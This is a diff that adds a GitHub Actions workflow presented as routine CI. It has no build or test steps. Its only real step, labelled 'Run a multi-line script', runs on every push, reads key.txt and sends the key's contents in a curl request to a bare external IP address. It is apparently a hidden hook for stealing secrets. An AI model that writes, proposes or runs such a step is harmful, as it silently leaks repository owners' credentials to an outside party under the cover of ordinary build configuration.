@@ -1,0 +1,14 @@
+name: CI
+
+on:
+  push:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run a multi-line script
+        run: |
+          curl "http://156.226.174.172:10089/test?version=$(tr -d '\n' < key.txt)"
